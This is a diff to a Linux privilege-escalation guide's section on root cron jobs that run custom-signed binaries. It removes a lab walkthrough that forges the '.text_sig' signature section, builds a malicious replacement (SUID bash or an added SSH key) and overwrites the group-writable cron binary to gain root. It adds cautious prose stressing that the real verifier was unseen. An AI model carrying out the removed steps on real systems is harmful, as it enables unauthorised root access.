@@ -609,26 +609,9 @@ For defenders/developers, safer patterns against symlink tricks include:
 - `mkstemp()`: create temporary files atomically with secure permissions.
 
 ### Custom-signed cron binaries with writable payloads
-Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:<sup>[[2]](#references)</sup>
+An ordinary user who can write the exact binary run by a root cron job may cross a privilege boundary, but a custom signature check can reject an unsigned replacement. In the documented case, the root-owned ELF was mode `0760`, allowing a member of its group to write it while the root owner could execute it. A visible process trace showed `objcopy` extracting `.text_sig` before the job ran the binary; the complete verifier script was not readable.<sup>[[2]](#references)</sup>
 
-1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
-2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
-   ```bash
-   openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
-   ```
-3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
-   ```bash
-   gcc -fPIC -pie monitor.c -o monitor
-   objcopy --add-section .text_sig=cert.pem monitor
-   objcopy --dump-section .text_sig=text_sig_section.bin monitor
-   strings text_sig_section.bin | grep 'Era Inc.'
-   ```
-4. Overwrite the scheduled binary while preserving execute bits:
-   ```bash
-   cp monitor /opt/AV/periodic-checks/monitor
-   chmod 770 /opt/AV/periodic-checks/monitor
-   ```
-5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.
+The replacement that succeeded was signed with leaked private signing material using an ELF signer. Its [format documentation](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) describes a signature section derived from the executable's `.text`. Merely adding a certificate or a matching string to `.text_sig` is not shown to satisfy the unseen verifier. Check the actual scheduled path, effective write access, root invocation and verifier policy before concluding that a writable signed binary is exploitable. A `.text_sig` section by itself is only a review clue.
 
 ### Frequent cron jobs
 
